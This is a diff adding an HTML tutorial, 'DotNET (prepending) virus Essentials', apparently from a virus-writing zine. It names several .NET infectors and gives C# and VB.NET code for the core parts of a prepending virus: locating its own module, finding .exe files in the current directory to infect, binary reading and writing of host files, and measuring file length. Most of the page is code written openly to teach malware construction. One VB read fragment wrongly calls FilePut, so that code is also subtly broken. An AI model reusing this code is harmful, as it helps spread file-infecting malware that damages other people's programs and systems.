@@ -1,0 +1,514 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso8859-1">
+<TITLE>... </TITLE> 
+<SCRIPT language="JavaScript">
+var TlxPgNm='index';
+</SCRIPT>
+<META http-equiv="GENERATOR" CONTENT="Created with Trellix Web, HTML Exporter 2.6.2685"> 
+<!-- MAP_LOCATION=( 132, 24) -->
+</HEAD>
+<BODY BGCOLOR="#000000" TEXT="#F7F7FF" LINK="#FFCC33" ALINK="#009D27" VLINK="#FFCC33">
+    <TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" WIDTH="100%">
+ <Tr>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+  <Td width="100%"></Td>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+ </Tr>
+ <Tr>
+  <Td ALIGN="LEFT" WIDTH="10" VALIGN="top"><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+  <Td><TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="5" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>DotNET (prepending) virus Essentials</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>DotNet has been here for more than a year i think but look at the reported viruses that target or use the dotNET framework...</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dotnet (aka donut) by benny : a win32asm native code that infects headers of msil executables (released in 29a6)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>sharp (aka sharpei) by gigabyte : a win32asm program that extracts a c# exe and calls that to infect exes (to be released in Fantasy #1 accdg to the author)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>my dotnet prependers...</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>syra (aka flatei) : a c# program that prepends itself to exe files in current directory. (submitted to 29a for its #7 zine)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>3589 (aka flatei.b, .net.infector.gen, flatei.3589) : a condensed syra variant, reassembled in ilasm. (submitted to TKT for Fantasy #1)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>veebeep (aka flatei.c, alpoor) : a vb.net program that prepends itself to exe files in current directory. (released in this zine)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>syra.b : a c# prepender, which is another variant of syra, that chooses to infect dotnet files only in current directory (submitted to 29a for its #7 zine)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>only a few, ei. why? is it the lack of interest among virus writers at targeting .net? is it the hugeness of the dotnet framework available at microsoft's site?</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>anyways, this document will show the essentials of a dotnet virus.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>======================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>identifying itself : Reflection</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>======================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>a virus should be able to read itself to infect other files... thanks to System.Reflection namespace of the dotnet framework...</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>ie. compiled file is modname.exe in c:\bin</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>from the .NET Framework SDK Documentation</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.Reflection; </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System; </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>public class Simple </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>{ </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>public static void Main () { Module mod = Assembly.GetExecutingAssembly().GetModules () [0]; </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine (&quot;Module Name is &quot; + mod.Name); </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine (&quot;Module FullyQualifiedName is &quot; + mod.FullyQualifiedName); </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine (&quot;Module ScopeName is &quot; + mod.ScopeName); } </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>} </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>/* Produces this output: Module Name is modname.exe Module FullyQualifiedName is C:\Bin\modname.exe Module ScopeName is modname.exe */</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.NET</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Imports System.Reflection </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Imports System </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Public Class Simple </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Public Shared Sub Main() </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim myMod As System.Reflection.Module = _ [Assembly].GetExecutingAssembly().GetModules()(0) </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine(&quot;Module Name is &quot; _ + myMod.Name) </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine(&quot;Module FullyQualifiedName is &quot; _ + myMod.FullyQualifiedName) </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Console.WriteLine(&quot;Module ScopeName is &quot; _ + myMod.ScopeName) </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Sub </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Class </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>' Produces this output: </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>' Module Name is modname.exe </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>' Module FullyQualifiedName is C:\Bin\modname.exe </B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>' Module ScopeName is modname.exe</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>====================</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Searchin for files to infect</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>====================</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>seeking for the enemy in current directory..</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>class search {</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>public static void Main(String[] args)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), &quot;*.exe&quot;);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;foreach (string file in files){</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;infect(file)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>}</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.NET</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Imports Microsoft.VisualBasic</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Module Virus</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Sub Main()</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim sfile as String</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim a as String</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim arr1 as String()</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim host as String</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>sfile = Dir(CurDir() &amp; &quot;\*.exe&quot;)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>While sfile &lt;&gt; &quot;&quot;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>a = a &amp; sfile &amp; &quot;/&quot;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>sfile = Dir</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End While</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>arr1 = Split(a, &quot;/&quot;)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>for each host in arr1</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infect(host)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>next host</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Sub</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Module</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Binary Reader</B></FONT><BR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>this will binary read &quot;filehere&quot; and store the read bytes to bytes1</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;FileStream fs1 = new FileStream(&quot;filehere&quot;, FileMode.OpenOrCreate, FileAccess.Read);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;BinaryReader r1 = new BinaryReader(fs1);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int host = (int) fs1.Length;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int vir = host;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;r1.BaseStream.Seek(0, SeekOrigin.Begin);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;byte[] bytes1 = new byte[vir];</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int numBytesToRead = vir;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int numBytesRead = 0;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;while (numBytesToRead &gt; 0)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int n = r1.Read(bytes1, numBytesRead, numBytesToRead);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;if (n==0)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;break;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;numBytesRead += n;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;numBytesToRead -= n;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;r1.Close();</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<bR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.Net</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports Microsoft.VisualBasic</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim fs1 = New FileStream(&quot;filehere&quot;, FileMode.Open, FileAccess.Read)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim r1 As New BinaryReader(fs1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>hostlen1 = fs1.Length</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>r1.BaseStream.Seek(0, SeekOrigin.Begin)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim bytes1(hostlen1) As Byte</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim numBytesToRead1 As Integer = CInt(fs1.Length)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim numBytesRead1 As Integer = 0</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>While numBytesToRead1 &gt; 0</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim n1 As Integer = r1.Read(bytes1, numBytesRead1, numBytesToRead1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If n1 = 0 Then ' We're at EOF</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Exit While</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>numBytesRead1 += n1</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>numBytesToRead1 -= n1</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End While</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>r1.Close()</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>or</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports Microsoft.VisualBasic</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim bytes1 as string</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileOpen(1, &quot;filehere&quot;, OpenMode.Binary)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>bytes1 = Space(LOF(1))</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FilePut(1, bytes1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileClose(1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Binary Write</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>Writes bytes1 to &quot;file1.exe&quot;</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[...]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileStream fs1 = new FileStream(&quot;file1.exe&quot;, FileMode.OpenOrCreate, FileAccess.Write);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>BinaryWriter w = new BinaryWriter(fs1); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>w.BaseStream.Seek(0, SeekOrigin.Begin);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>w.Write(bytes1);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>w.Close();</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>vb.net</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports Microsoft.VisualBasic</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileOpen(1, &quot;file1.exe&quot;, OpenMode.Binary)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FilePut(1, bytes1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileClose(1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>========</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>file length</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>========</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>essential if you wanna get the exact virus bytes or host bytes...</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>host is the length of &quot;file.exe&quot;</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[...]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>FileStream fs1 = new FileStream(&quot;file.exe&quot;, FileMode.OpenOrCreate, FileAccess.Read);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>int host = (int) fs1.Length;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[...]</B></FONT><BR>
+<bR>
